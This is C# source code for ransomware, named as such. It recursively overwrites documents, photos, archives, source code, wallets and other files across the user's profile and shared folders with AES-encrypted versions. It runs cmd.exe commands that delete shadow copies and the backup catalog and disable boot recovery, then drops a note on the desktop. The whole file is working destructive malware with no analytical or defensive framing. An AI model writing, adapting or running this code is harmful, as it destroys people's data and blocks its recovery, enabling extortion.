using System;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Text;

internal class Ransomware
{
	private static void Main1()
	{
		string key = "YourEncryptionKeyHere";
		string[] array = new string[18]
		{
			Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
			Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Links",
			Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Contacts",
			Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Documents",
			Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Downloads",
			Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Pictures",
			Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Music",
			Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\OneDrive",
			Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Saved Games",
			Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Favourites",
			Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Searches",
			Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Videos",
			Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
			Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments),
			Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures),
			Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic),
			Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos),
			Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory)
		};
		string[] targetFileTypes = new string[84]
		{
			".7z", ".7-zip", ".accdb", ".ace", ".apk", ".arj", ".asp", ".aspx", ".avi", ".backup",
			".bak", ".bay", ".bmp", ".bz2", ".cab", ".cer", ".contact", ".core", ".cpp", ".crt",
			".cs", ".css", ".csv", ".dat", ".db", ".dll", ".doc", ".docx", ".dwg", ".exif",
			".flv", ".gzip", ".htm", ".html", ".ibank", ".ico", ".ini", ".iso", ".jar", ".java",
			".jpe", ".jpeg", ".jpg", ".js", ".lnk", ".lzh", ".m4a", ".mdb", ".mkv", ".mov",
			".mp3", ".mp4", ".mpeg", ".mpg", ".odt", ".p7c", ".pas", ".pdb", ".pdf", ".php",
			".png", ".ppt", ".pptx", ".psd", ".py", ".rar", ".rb", ".rtf", ".settings", ".sie",
			".sql", ".sum", ".tar", ".txt", ".wallet", ".wma", ".wmv", ".xls", ".xlsb", ".xlsm",
			".xlsx", ".xml", ".xz", ".zip"
		};
		string[] array2 = array;
		foreach (string directory in array2)
		{
			EncryptDirectory(directory, key, targetFileTypes);
		}
		ExecuteDestructiveCommands();
		CreateFileOnDesktop();
		Console.WriteLine("Ransomware executed successfully.");
	}

	private static void EncryptDirectory(string directory, string key, string[] targetFileTypes)
	{
		foreach (string text in targetFileTypes)
		{
			string[] files = Directory.GetFiles(directory, "*" + text, SearchOption.AllDirectories);
			string[] array = files;
			foreach (string path in array)
			{
				byte[] bytes = EncryptFile(File.ReadAllBytes(path), key);
				File.WriteAllBytes(path, bytes);
			}
		}
	}

	private static byte[] EncryptFile(byte[] data, string key)
	{
		using Aes aes = Aes.Create();
		aes.Key = Encoding.UTF8.GetBytes(key);
		aes.IV = new byte[16];
		using MemoryStream memoryStream = new MemoryStream();
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(data, 0, data.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	private static void ExecuteDestructiveCommands()
	{
		Process.Start("cmd.exe", "/C vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
		Process.Start("cmd.exe", "/C bcdedit /set {default} bootstatuspolicy ignoreallfailures");
		Process.Start("cmd.exe", "/C bcdedit /set {default} recoveryenabled no");
		Process.Start("cmd.exe", "/C wbadmin delete catalog -quiet");
	}

	private static void CreateFileOnDesktop()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		File.WriteAllText(Path.Combine(folderPath, "dead.txt"), "прив");
	}
}
